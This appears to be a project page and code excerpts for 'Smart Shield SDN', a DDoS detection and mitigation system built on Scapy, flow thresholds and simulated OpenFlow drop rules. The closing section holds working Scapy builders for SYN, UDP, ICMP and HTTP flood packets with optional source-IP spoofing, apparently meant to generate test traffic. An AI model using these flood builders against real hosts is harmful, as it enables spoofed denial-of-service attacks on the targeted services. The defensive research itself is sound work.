ABOUT THE PROJECT

Smarter defense.
Clearer decisions.

Smart Shield SDN combines Software Defined Networking principles, machine learning and explainable AI to create an automated DDoS defense workflow.

🛡️ The problem

Static rules and manual intervention can struggle with evolving DDoS traffic. The project focuses on automated detection and mitigation with transparent explanations.

🧠 The approach

Flow-level features are used by XGBoost and LSTM models. SHAP/LIME-style explainability exposes influential traffic characteristics behind a prediction.

THREAT COVERAGE

Four attack patterns.

🔴 SYN Flood

TCP SYN-heavy traffic targeting connection state.

🟡 UDP Flood

High-volume UDP traffic targeting bandwidth.

🔵 HTTP Flood

Layer-7 HTTP request flooding.

🟣 ICMP Flood

Excessive ICMP traffic targeting processing resources.

📊 Flow Features

Packet rate, TCP flags, byte counts, inter-arrival time and protocol distribution.

🔐 Privacy

The report emphasizes traffic metadata without payload inspection.

WINDOW_SECONDS       = 5      # sliding window for rate calculation
PPS_THRESHOLD        = 100    # packets/sec from single IP → alert
SYN_RATIO_THRESHOLD  = 0.85   # if >85% of TCP packets are SYN → SYN flood
UDP_RATIO_THRESHOLD  = 0.80   # if >80% of traffic is UDP → UDP flood
ICMP_RATIO_THRESHOLD = 0.70   # if >70% of traffic is ICMP → ICMP flood

# ── Packet sniffer callback ───────────────────────────────────────────────
def packet_callback(pkt, victim_ip):
    if not pkt.haslayer(IP):
        return

    src  = pkt[IP].src
    dst  = pkt[IP].dst
    size = len(pkt)
    ts   = time.time()

    # Only care about traffic going TO the victim
    if dst != victim_ip:
        return

    # Identify protocol + flags
    proto = "OTHER"
    flags = ""
    if pkt.haslayer(TCP):
        proto = "TCP"
        flags = str(pkt[TCP].flags)
    elif pkt.haslayer(UDP):
        proto = "UDP"
    elif pkt.haslayer(ICMP):
        proto = "ICMP"

    with state_lock:
        # If already blocked, silently drop (simulate OpenFlow DROP rule)
        if src in blocked_ips:
            return
        packet_log.append((ts, src, proto, size, flags))


# ── Detection engine ──────────────────────────────────────────────────────
def analyze_traffic(victim_ip):
    """
    Runs every second. Checks packet log for attack signatures:
      1. High pkt/s from a single source IP
      2. SYN flood (TCP with S flag dominating)
      3. UDP flood
      4. ICMP flood
    Returns list of (attacker_ip, attack_type, pps) tuples.
    """
    now = time.time()
    window_start = now - WINDOW_SECONDS
    detections = []

    with state_lock:
        # Only look at packets in the sliding window
        recent = [p for p in packet_log if p[0] >= window_start]

    if not recent:
        return detections

    # Group by source IP
    by_src = defaultdict(list)
    for ts, src, proto, size, flags in recent:
        by_src[src].append((ts, proto, size, flags))

    for src_ip, pkts in by_src.items():
        pps = len(pkts) / WINDOW_SECONDS

        if pps < PPS_THRESHOLD:
            continue  # below threshold — normal traffic

        # Count protocol breakdown
        tcp_pkts  = [p for p in pkts if p[1] == "TCP"]
        syn_pkts  = [p for p in tcp_pkts if "S" in p[3] and "A" not in p[3]]
        udp_pkts  = [p for p in pkts if p[1] == "UDP"]
        icmp_pkts = [p for p in pkts if p[1] == "ICMP"]
        total     = len(pkts)

        if total == 0:
            continue

        # Classify attack type
        attack_type = None
        if tcp_pkts and len(syn_pkts) / max(len(tcp_pkts), 1) >= SYN_RATIO_THRESHOLD:
            attack_type = "SYN Flood"
        elif len(udp_pkts) / total >= UDP_RATIO_THRESHOLD:
            attack_type = "UDP Flood"
        elif len(icmp_pkts) / total >= ICMP_RATIO_THRESHOLD:
            attack_type = "ICMP Flood"
        elif pps >= PPS_THRESHOLD:
            attack_type = "HTTP/Generic Flood"

        if attack_type:
            detections.append((src_ip, attack_type, round(pps, 1), total))

    return detections


# ── Mitigation: push block rule ───────────────────────────────────────────
def push_block_rule(attacker_ip, attack_type, victim_ip, pps):
    """
    Simulates pushing an OpenFlow DROP rule.
    In a real Ryu SDN setup this would call:
        datapath.send_msg(parser.OFPFlowMod(...))
    Here we add the IP to blocked_ips so the sniffer ignores its packets.
    """
    with state_lock:
        blocked_ips.add(attacker_ip)

    ts = datetime.now().strftime("%H:%M:%S")
    print(Fore.GREEN + Style.BRIGHT + f"\n  ✅ [{ts}] FLOW RULE PUSHED")
    print(Fore.GREEN + f"     DROP src={attacker_ip} → dst={victim_ip} dport=80")
    print(Fore.GREEN + f"     Rule type   : {attack_type}")
    print(Fore.GREEN + f"     Packets/sec : {pps}")
    print(Fore.GREEN + f"     Priority    : 1000  | Hard timeout: 300s\n")

    event = {
        "ts": ts,
        "attacker": attacker_ip,
        "victim": victim_ip,
        "type": attack_type,
        "pps": pps,
    }
    with state_lock:
        attack_log.append(event)
    return event

def parse_explanation_file(filepath):
    """
    Reads the file controller.py writes.
    Returns a dict with attack details + explanation text.
    """
    data = {
        "attacker": "Unknown",
        "victim":   "Unknown",
        "type":     "Unknown",
        "pps":      "?",
        "time":     "?",
        "status":   "UNKNOWN",
        "explanation": "",
    }
    try:
        with open(filepath, "r") as f:
            lines = f.readlines()

        reading_explanation = False
        explanation_lines = []

        for line in lines:
            line = line.rstrip()
            if line == "---":
                reading_explanation = True
                continue
            if reading_explanation:
                explanation_lines.append(line)
            elif "=" in line:
                key, _, val = line.partition("=")
                key = key.strip().lower()
                val = val.strip()
                if key in data:
                    data[key] = val

        data["explanation"] = " ".join(explanation_lines).strip()
    except Exception as e:
        data["explanation"] = f"Could not read explanation: {e}"

    return data

def build_syn_packet(target_ip, target_port, spoof):
    """TCP SYN flood — half-open connections exhaust server state table."""
    src_ip = str(RandIP()) if spoof else None
    pkt = IP(dst=target_ip, src=src_ip) / TCP(
        sport=RandShort(),
        dport=target_port,
        flags="S",                    # SYN only
        seq=random.randint(0, 2**32),
        window=65535,
    )
    return pkt


def build_udp_packet(target_ip, target_port, spoof):
    """UDP flood — saturates bandwidth with random payload."""
    src_ip = str(RandIP()) if spoof else None
    payload = Raw(load=random.randbytes(random.randint(64, 1400)))
    pkt = IP(dst=target_ip, src=src_ip) / UDP(
        sport=RandShort(),
        dport=target_port,
    ) / payload
    return pkt


def build_icmp_packet(target_ip, spoof):
    """ICMP Echo (Ping) flood — overwhelms ICMP processing."""
    src_ip = str(RandIP()) if spoof else None
    payload = Raw(load=b"X" * random.randint(56, 1400))
    pkt = IP(dst=target_ip, src=src_ip) / ICMP() / payload
    return pkt


def build_http_packet(target_ip, target_port, spoof):
    """HTTP GET flood — layer-7 flood on port 80."""
    src_ip = str(RandIP()) if spoof else None
    paths = ["/", "/index.html", "/login", "/api/data", "/search?q=" + "A" * 50]
    http_req = (
        f"GET {random.choice(paths)} HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()
    pkt = IP(dst=target_ip, src=src_ip) / TCP(
        sport=RandShort(),
        dport=target_port,
        flags="PA",   # PSH+ACK (data push)
    ) / Raw(load=http_req)
    return pkt

ATTACK_BUILDERS = {
    "SYN":  lambda ip, port, spoof: build_syn_packet(ip, port, spoof),
    "UDP":  lambda ip, port, spoof: build_udp_packet(ip, port, spoof),
    "ICMP": lambda ip, port, spoof: build_icmp_packet(ip, spoof),
    "HTTP": lambda ip, port, spoof: build_http_packet(ip, port, spoof),
}
